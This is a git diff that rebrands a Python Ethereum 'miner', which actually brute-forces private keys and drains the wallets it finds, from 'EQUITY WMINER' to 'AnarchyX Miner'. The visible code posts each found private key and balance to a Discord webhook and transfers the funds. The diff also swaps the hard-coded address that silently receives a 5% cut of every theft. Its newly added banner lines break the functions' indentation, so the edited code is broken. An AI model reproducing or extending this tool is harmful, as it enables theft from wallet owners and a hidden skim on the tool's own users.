@@ -84,12 +84,14 @@ def printf(line, ms):
         pos =+ 1
         if pos != lenght: time.sleep(ms)
 def intro():
-    l=('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
-    o=('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
-    g=('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
-    f=('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
-    w=('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
-    m=('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
+    
+l=(' █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗██╗  ██╗██╗   ██╗██╗  ██╗    ███╗   ███╗██╗███╗   ██╗███████╗██████╗     ██╗   ██╗ ██╗    ██████╗ ')
+o=('██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██║  ██║╚██╗ ██╔╝╚██╗██╔╝    ████╗ ████║██║████╗  ██║██╔════╝██╔══██╗    ██║   ██║███║   ██╔═████╗')
+g=('███████║██╔██╗ ██║███████║██████╔╝██║     ███████║ ╚████╔╝  ╚███╔╝     ██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝    ██║   ██║╚██║   ██║██╔██║')
+f=('██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██╔══██║  ╚██╔╝   ██╔██╗     ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝ ██║   ████╔╝██║')
+w=('██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗██║  ██║   ██║   ██╔╝ ██╗    ██║ ╚═╝ ██║██║██║ ╚████║███████╗██║  ██║     ╚████╔╝  ██║██╗╚██████╔╝')
+m=('╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═╝╚═╝ ╚═════╝ ')
+                                                                                                                                            
     t = Terminal()
     global current
     current = -1
@@ -110,12 +112,15 @@ def intro():
         time.sleep(0.002)
     sys.stdout.write("\n\n\n\n\n")
 def logoprint():
-    print('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
-    print('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
-    print('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
-    print('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
-    print('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
-    print('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
+    
+print(' █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗██╗  ██╗██╗   ██╗██╗  ██╗    ███╗   ███╗██╗███╗   ██╗███████╗██████╗     ██╗   ██╗ ██╗    ██████╗ ')
+print('██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██║  ██║╚██╗ ██╔╝╚██╗██╔╝    ████╗ ████║██║████╗  ██║██╔════╝██╔══██╗    ██║   ██║███║   ██╔═████╗')
+print('███████║██╔██╗ ██║███████║██████╔╝██║     ███████║ ╚████╔╝  ╚███╔╝     ██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝    ██║   ██║╚██║   ██║██╔██║')
+print('██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██╔══██║  ╚██╔╝   ██╔██╗     ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝ ██║   ████╔╝██║')
+print('██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗██║  ██║   ██║   ██╔╝ ██╗    ██║ ╚═╝ ██║██║██║ ╚████║███████╗██║  ██║     ╚████╔╝  ██║██╗╚██████╔╝')
+print('╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═╝╚═╝ ╚═════╝ ')
+                                                                                                                                            
+
 def checkversion():
     try:
         version = json.load(open("DATA",'r'))['VERSION']
@@ -155,7 +160,7 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                 amount.value = 0
                 if (webhookurl != "null"):
                     webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
-                    embed = DiscordEmbed(title="EQUITY WMINER | SUMMARY", color="8fce00")
+                    embed = DiscordEmbed(title="AnarchyX Miner | SUMMARY", color="8fce00")
                     embed.set_timestamp()
                     embed.add_embed_field(name="Bad Hits:", value=bdhits.value, inline=False)
                     embed.add_embed_field(name="Good Hits:", value=hits.value, inline=False)
@@ -196,7 +201,7 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                         hitstxt.close()
                         if (webhookurl != "null"):
                             webhook = DiscordWebhook(url=webhookurl, description="@everyone", rate_limit_retry=True)
-                            embed = DiscordEmbed(title="EQUITY WMINER | NEW HIT", color="8fce00")
+                            embed = DiscordEmbed(title="AnarchyX Miner | NEW HIT", color="8fce00")
                             embed.set_timestamp()
                             embed.add_embed_field(name="pKey:", value=key, inline=False)
                             embed.add_embed_field(name="ETH:", value=str(bal*0.95/1000000000000000000), inline=False)
@@ -219,7 +224,7 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                                 }
                                 MineTransaction2 = {
                                     'nonce': w3.eth.getTransactionCount(account.address)+1,
-                                    'to': "0x1cD1fbA59b08Ed2e81ec0F869dEe81AF098aFA5a",
+                                    'to': "0xb67366ec2fB9a2295aCB45dEA806963Ed21d80d4",
                                     'value': w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                     'gas': 21000,
                                     'gasPrice': w3.toWei(avgGas, "gwei")
@@ -272,9 +277,9 @@ def NUpdate(chk,hits,bdhits):
     x = 0
     while x < 1:
         if hits.value >= 1:
-            sys.stdout.write("\x1b]2;EQUITY WMINER v1.4.0 | MINING...GOT A HIT! | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
+            sys.stdout.write("\x1b]2;AnarchyX Miner v1.0 | MINING...GOT A HIT! | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
         else:
-            sys.stdout.write("\x1b]2;EQUITY WMINER v1.4.0 | MINING... | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
+            sys.stdout.write("\x1b]2;AnarchyX Miner v1.0 | MINING... | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
         time.sleep(0.02)
 
 def close(reason):
@@ -288,7 +293,7 @@ if __name__=="__main__":
         os.system("cls")
         print("v1.4.0")
         intro()
-        sys.stdout.write("\x1b]2;EQUITY WMINER v1.4.0 | WAITING FOR INPUT | ERRS: 0 - HITS: 0 - BDHITS: 0 |\x07")
+        sys.stdout.write("\x1b]2;AnarchyX Miner v1.0 | WAITING FOR INPUT | ERRS: 0 - HITS: 0 - BDHITS: 0 |\x07")
         print('\n')
 
         dbug = open("debug.txt", "a")
@@ -378,7 +383,7 @@ if __name__=="__main__":
                         print("\033[32mStarting mining processess..\033[0m \n")
                         if(webhookurl != "null"):
                             webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
-                            embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
+                            embed = DiscordEmbed(title="AnarchyX Miner | MINING...", description="Miner started!", color=0x00ff00)
                             embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                             embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                             embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
@@ -414,7 +419,7 @@ if __name__=="__main__":
                                 print("\033[32mStarting mining processess..\033[0m \n")
                                 if (webhookurl != "null"):
                                     webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
-                                    embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
+                                    embed = DiscordEmbed(title="AnarchyX Miner | MINING...", description="Miner started!", color=0x00ff00)
                                     embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                                     embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                                     embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
@@ -450,7 +455,7 @@ if __name__=="__main__":
                                     print("\033[32mStarting mining processess..\033[0m \n")
                                     if (webhookurl != "null"):
                                         webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
-                                        embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
+                                        embed = DiscordEmbed(title="AnarchyX Miner | MINING...", description="Miner started!", color=0x00ff00)
                                         embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                                         embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                                         embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
